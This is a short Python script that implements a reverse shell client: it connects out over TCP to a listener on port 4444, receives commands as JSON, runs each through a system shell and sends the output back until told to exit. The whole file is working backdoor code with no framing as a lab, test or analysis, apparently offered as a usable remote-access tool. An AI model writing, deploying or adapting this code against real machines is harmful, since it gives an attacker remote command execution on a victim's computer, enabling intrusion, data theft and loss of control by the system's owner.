#!/usr/bin/env python

import subprocess
import socket
import json
import sys

class Client:
    #
    def __init__(self,addr,port):
        #
        self.addr = addr
        #
        self.port = int(port)
        #
        self.s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        #
        self.s.connect((self.addr,self.port))

    def Receive(self):
        #
        json_data = ""
        #
        while(True):
            #
            try:
                #
                json_data = json_data+self.s.recv(1024)
                #
                return json.loads(json_data)
                #
            except ValueError:
                #
                continue

    def Transmission(self,data):
        #
        json_data = json.dumps(data)
        #
        self.s.send(json_data)

    def ExecuteCommand(self,cmd):
        #
        return subprocess.check_output(cmd,shell=True)

    def run(self):
        #
        while(True):
            #
            cmd = self.Receive()
            #
            if(cmd[0] == "exit"):
                #
                self.s.close()
                #
                exit()
                #
            cmd_res = self.ExecuteCommand(cmd)
            #
            self.Transmission(cmd_res)

if(__name__ == '__main__'):
    #
    C = Client("0.0.0.0",4444)
    #
    C.run()
